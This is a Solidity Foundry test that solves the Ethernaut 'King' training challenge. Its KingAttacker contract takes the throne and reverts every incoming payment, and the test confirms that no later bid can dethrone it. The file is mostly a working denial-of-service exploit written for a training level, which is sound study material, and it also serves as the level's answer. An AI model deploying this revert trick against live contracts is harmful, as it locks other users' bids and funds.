// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {King} from "../src/levels/King.sol";

/// Ethernaut #9 "King" → denial-of-service (no catalog entry; the kingship transfer is a `transfer`
/// to an attacker-controlled address that can revert). Become king with a contract whose `receive`
/// reverts, so no one can ever dethrone you. Win: `_king()` is the attacker, not the level owner.
contract KingAttacker {
    function seize(King k) external payable {
        (bool ok,) = address(k).call{value: msg.value}("");
        require(ok, "seize failed");
    }

    receive() external payable {
        revert("long live the king"); // any attempt to pay us (dethrone) reverts
    }
}

contract KingTest is Test {
    receive() external payable {} // this contract is the initial king; accept the prize payout

    function test_solve_king() public {
        vm.deal(address(this), 10 ether);
        King lvl = new King{value: 1 ether}(); // prize = 1 ether, king = this
        KingAttacker a = new KingAttacker();

        a.seize{value: 1 ether}(lvl); // pay the prize -> king = attacker
        assertEq(lvl._king(), address(a), "attacker is king");

        // DoS: any further bid reverts because paying the malicious king reverts.
        (bool ok,) = address(lvl).call{value: 2 ether}("");
        assertFalse(ok, "no one can dethrone the malicious king");
    }
}
